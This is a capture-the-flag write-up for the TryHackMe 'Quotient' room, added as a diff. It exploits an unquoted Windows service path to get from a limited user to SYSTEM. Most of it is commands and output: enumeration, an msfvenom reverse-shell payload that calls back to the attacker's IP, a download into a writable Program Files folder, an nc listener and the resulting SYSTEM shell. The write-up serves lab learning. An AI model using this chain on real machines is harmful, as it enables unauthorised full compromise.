@@ -1,0 +1,188 @@
+ ██████╗ ██╗   ██╗ ██████╗ ████████╗██╗███████╗███╗   ██╗████████╗
+██╔═══██╗██║   ██║██╔═══██╗╚══██╔══╝██║██╔════╝████╗  ██║╚══██╔══╝
+██║   ██║██║   ██║██║   ██║   ██║   ██║█████╗  ██╔██╗ ██║   ██║   
+██║▄▄ ██║██║   ██║██║   ██║   ██║   ██║██╔══╝  ██║╚██╗██║   ██║   
+╚██████╔╝╚██████╔╝╚██████╔╝   ██║   ██║███████╗██║ ╚████║   ██║   
+ ╚══▀▀═╝  ╚═════╝  ╚═════╝    ╚═╝   ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
+            https://tryhackme.com/room/quotient
+            
+"Grammar is important. Don't believe me? Just see what happens when you forget punctuation."
+
+--Use xfreerdp to connect to the machine with the credentials listed:
+{{xfreerdp /u:sage /p:'gr33ntHEphgK2&V' /v:[Machine IP]}}
+
+
+--Once logged in, let's view some information:
+
+C:\Users\Sage>systeminfo
+
+Host Name:                 THM-QUOTIENT
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00429-70000-00000-AA092
+Original Install Date:     3/7/2022, 2:33:36 AM
+System Boot Time:          11/17/2022, 4:16:19 PM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.2.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     4,096 MB
+Available Physical Memory: 2,749 MB
+Virtual Memory: Max Size:  5,504 MB
+Virtual Memory: Available: 4,152 MB
+Virtual Memory: In Use:    1,352 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\THM-QUOTIENT
+Hotfix(s):                 6 Hotfix(s) Installed.
+                           [01]: KB5013892
+                           [02]: KB4535680
+                           [03]: KB4577586
+                           [04]: KB4589208
+                           [05]: KB5015811
+                           [06]: KB5014797
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.131.80
+                                 [02]: fe80::6162:1d40:b5c1:b3b4
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+
+C:\Users\Sage>net user sage
+User name                    Sage
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            7/19/2022 10:35:44 AM
+Password expires             Never
+Password changeable          7/19/2022 10:35:44 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/17/2022 4:21:35 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Desktop Users *Users
+Global Group memberships     *None
+The command completed successfully.
+
+
+--And privileges:
+
+C:\Users\Sage>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+--SeChangeNotify can't be used for any type of privilege escalation.
+--The hint at the beginning is probably referring to unquoted service paths, which we can try to find with:
+
+{{wmic service get name,displayname,pathname,startmode |findstr /i /v "C:\Windows\\"}}
+
+C:\Users\Sage>wmic service get name,displayname,pathname,startmode |findstr /i /v "C:\Windows\\"
+DisplayName                                                                         Name                                      PathName                                                                           StartMode
+Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                 Auto
+AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                   Auto
+Developmenet Service                                                                Development Service                       C:\Program Files\Development Files\Devservice Files\Service.exe                    Auto
+LSM                                                                                 LSM                                                                                                                          Unknown
+NetSetupSvc                                                                         NetSetupSvc                                                                                                                  Unknown
+Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"         Manual
+Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2205.7-0\NisSrv.exe"      Manual
+Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2205.7-0\MsMpEng.exe"     Auto
+Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                               Manual
+
+--Development Services seems to be the one we're looking for.
+
+{{sc qc "Development Service" state=all}}
+
+C:\Users\Sage>sc qc "Development Service" state=all
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Development Service
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Development Files\Devservice Files\Service.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Developmenet Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+        
+--If we have write access to any of the folders in the path that it checks for the service in, we can exploit it.
+--Check each one, starting at the end, until we have a hit:
+
+icacls "C:\Program Files\Development Files\Devservice Files"
+icacls "C:\Program Files\Development Files"
+
+--The output:
+
+C:\Users\Sage>icacls "C:\Program Files\Development Files"
+C:\Program Files\Development Files BUILTIN\Users:(W)
+
+--Next, we will make a payload for a reverse shell with the name of the service file it will look for in that particular folder, which since it is unquoted it should be Devservice (and then .exe at the end)
+
+{{msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Your tun0 IP] LPORT=[port] -f exe -o Devservice.exe}}
+--If you get some kind of error, try with sudo. Idk, worked for me lol
+
+--On your machine, start a http server:
+{{python3 -m http.server}}
+
+--On the victim computer, open Powershell and download the payload:
+
+{{wget http://[Your tun0 IP]:8000/Devservice.exe -o "c:\Program Files\Development Files\Devservice.exe"}}
+
+--And change the permissions of the payload:
+{{icacls "C:\Program Files\Development Files\Devservice.exe" /grant Everyone:F}}
+
+--Start a listener on the port you specified in the payload:
+{{nc -lvnp [port]}}
+
+--Since this service starts at boot, all we need to do is restart the machine and catch the shell. It will take a minute:
+{{shutdown -r}}
+
+
+nc -lvnp 1234             
+listening on [any] 1234 ...
+connect to [10.2.5.216] from (UNKNOWN) [10.10.131.80] 49670
+Microsoft Windows [Version 10.0.17763.3165]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+Congrats! Flag is in C:\Users\Administrator\Desktop\
